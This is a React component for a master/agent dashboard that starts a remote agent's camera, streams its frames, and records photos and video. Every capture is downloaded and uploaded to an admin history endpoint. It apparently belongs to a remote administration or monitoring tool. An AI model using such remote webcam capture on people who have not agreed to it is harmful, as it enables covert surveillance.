import { useEffect, useState, useRef } from 'react'
import { dashboardSocket } from '../utils/socket'
import { savePhoto, saveVideo } from '../utils/cameraMedia'
import CameraMediaPanel from './CameraMediaPanel'

export default function CameraView({ agentId, agentName, enabled, onStarted, onStopped }: { agentId: string; agentName: string; enabled: boolean; onStarted?: () => void; onStopped?: () => void }) {
  const [frame, setFrame] = useState<string | null>(null)
  const frameRef = useRef<string | null>(null)
  const [running, setRunning] = useState(false)
  const [recording, setRecording] = useState(false)
  const [res, setRes] = useState<number>(720)
  const [q, setQ] = useState<number>(60)
  const [fps, setFps] = useState<number | 'default'>('default')
  const [showPanel, setShowPanel] = useState(false)
  const canvasRef = useState<HTMLCanvasElement | null>(null)[0] || null
  // Workaround: create canvas element on demand
  const getCanvas = () => {
    let c = document.getElementById('cam-canvas') as HTMLCanvasElement | null
    if (!c) {
      c = document.createElement('canvas')
      c.id = 'cam-canvas'
      c.style.display = 'none'
      document.body.appendChild(c)
    }
    return c
  }
  const recorderRef = useRef<MediaRecorder | null>(null)
  let _chunks: Blob[] = []

  useEffect(() => {
    const cb = (f: { data: string; w?: number; h?: number }) => {
      setFrame(f.data)
      frameRef.current = f.data
      const cvs = getCanvas()
      const img = new Image()
      img.onload = () => {
        cvs.width = img.width; cvs.height = img.height
        const ctx = cvs.getContext('2d')!
        ctx.drawImage(img, 0, 0)
      }
      img.src = f.data
    }
    dashboardSocket.onCamera(agentId, cb)
    return () => dashboardSocket.offCamera(agentId, cb)
  }, [agentId])

  const start = () => { if (!enabled) return; dashboardSocket.startCamera(agentId, { fps: fps === 'default' ? undefined : fps, quality: q, height: res }); setRunning(true); try { onStarted && onStarted() } catch {} }
  const stop = async () => {
    dashboardSocket.stopCamera(agentId);
    setRunning(false);
    try {
      // export last frame as photo
      const cvs = getCanvas()
      const blob: Blob = await new Promise((res) => cvs.toBlob((b) => res(b || new Blob()), 'image/jpeg', 0.9)!)
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url; a.download = `camera-${(agentName||agentId).replace(/[^\w\-\. ]+/g, '_')}-${Date.now()}.jpg`
      document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url)
      // upload to backend history
      try {
        const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || (typeof window !== 'undefined' ? window.location.origin : '')
        const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''
        const fd = new FormData()
        fd.append('file', blob, 'camera.jpg')
        fd.append('agent_id', agentId)
        fd.append('kind', 'camera_photo')
        await fetch(`${apiBase}/admin/history/upload`, { method: 'POST', headers: { Authorization: `Bearer ${token}` }, body: fd })
      } catch {}
    } catch {}
    setFrame(null);
    try { onStopped && onStopped() } catch {}
  }

  // Do not auto-start; only stop on unmount if running
  useEffect(() => {
    return () => { try { stop(); } catch {} };
  }, []);

  const takePhoto = async () => {
    try {
      if (!enabled) return
      if (!running) start()
      // wait for first frame if needed
      const startTs = Date.now()
      while (!frameRef.current && Date.now() - startTs < 2000) {
        await new Promise((r) => setTimeout(r, 100))
      }
      const cvs = getCanvas()
      const blob: Blob = await new Promise((res) => cvs.toBlob((b) => res(b || new Blob()), 'image/jpeg', 0.9)!)
      const id = await savePhoto(agentId, agentName || agentId, blob)
      // auto-download
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url; a.download = `camera-${(agentName||agentId).replace(/[^\w\-\. ]+/g, '_')}-${Date.now()}.jpg`
      document.body.appendChild(a); a.click(); a.remove()
      URL.revokeObjectURL(url)
    } catch {}
  }

  const startRecord = async () => {
    if (recording) return
    if (!enabled) return
    if (!running) start()
    // wait for first frame to size the canvas
    const startTs = Date.now()
    while (!frameRef.current && Date.now() - startTs < 2000) {
      await new Promise((r) => setTimeout(r, 100))
    }
    const cvs = getCanvas()
    const stream = (cvs as any).captureStream ? (cvs as any).captureStream(8) : null
    if (!stream) return
    const rec = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' })
    _chunks = []
    rec.ondataavailable = (e) => { if (e.data && e.data.size) _chunks.push(e.data) }
    rec.onstop = async () => {
      const blob = new Blob(_chunks, { type: 'video/webm' })
      await saveVideo(agentId, agentName || agentId, blob)
      // upload to backend history
      try {
        const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || (typeof window !== 'undefined' ? window.location.origin : '')
        const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''
        const fd = new FormData()
        fd.append('file', blob, 'camera.webm')
        fd.append('agent_id', agentId)
        fd.append('kind', 'camera_video')
        await fetch(`${apiBase}/admin/history/upload`, { method: 'POST', headers: { Authorization: `Bearer ${token}` }, body: fd })
      } catch {}
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url; a.download = `camera-${(agentName||agentId).replace(/[^\w\-\. ]+/g, '_')}-${Date.now()}.webm`
      document.body.appendChild(a); a.click(); a.remove()
      URL.revokeObjectURL(url)
    }
    rec.start()
    recorderRef.current = rec
    setRecording(true)
  }
  const stopRecord = () => {
    try { recorderRef.current?.stop() } catch {}
    setRecording(false)
  }

  return (
    <div className="card" style={{ marginTop: 10 }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
        <h3 style={{ color: '#9efc9e', margin: 0 }}>Camera</h3>
        <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center' }}>
          <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap', alignItems: 'center' }}>
            <select className="input" value={res} onChange={(e) => setRes(parseInt(e.target.value))}>
              <option value={240}>240p</option>
              <option value={480}>480p</option>
              <option value={720}>720p</option>
              <option value={1080}>1080p</option>
            </select>
            <select className="input" value={fps === 'default' ? 'default' : String(fps)} onChange={(e) => { const v = e.target.value; setFps(v === 'default' ? 'default' : parseInt(v)); }}>
              <option value="default">fps (default)</option>
              <option value="10">10</option>
              <option value="20">20</option>
              <option value="30">30</option>
              <option value="40">40</option>
              <option value="50">50</option>
              <option value="60">60</option>
            </select>
            <input className="input" type="number" min={10} max={95} step={1} value={q} onChange={(e) => setQ(Math.max(10, Math.min(95, parseInt(e.target.value)||60)))} style={{ width: 80 }} title="JPEG quality" />
          </div>
          <button className="btn" onClick={start} disabled={!enabled || running}>Start</button>
          <button className="btn secondary" onClick={stop} disabled={!running}>Stop</button>
          <button className="btn" onClick={takePhoto} disabled={!enabled}>Take Photo</button>
          {!recording ? (
            <button className="btn" onClick={startRecord} disabled={!enabled}>Start Record</button>
          ) : (
            <button className="btn secondary" onClick={stopRecord}>Stop Record</button>
          )}
          <button className="btn secondary" onClick={() => { const url = `${window.location.origin}/camera.html?agentId=${encodeURIComponent(agentId)}&agentName=${encodeURIComponent(agentName)}`; window.open(url, '_blank'); }}>Open in New Tab</button>
        </div>
      </div>
      {!enabled && <div style={{ color: '#ffb347', fontSize: 12, marginBottom: 6 }}>Camera not available on this agent.</div>}
      <div style={{ border: '1px solid #222', borderRadius: 6, background: '#000', display: 'flex', alignItems: 'center', justifyContent: 'center', minHeight: 240 }}>
        {frame ? (
          <img src={frame} style={{ maxWidth: '100%', width: '100%', objectFit: 'contain' }} />
        ) : (
          <div style={{ color: '#777', padding: 20 }}>{running ? 'Waiting for frames...' : 'Not running'}</div>
        )}
      </div>
      <CameraMediaPanel open={showPanel} onClose={() => setShowPanel(false)} agentId={agentId} />
    </div>
  )
}
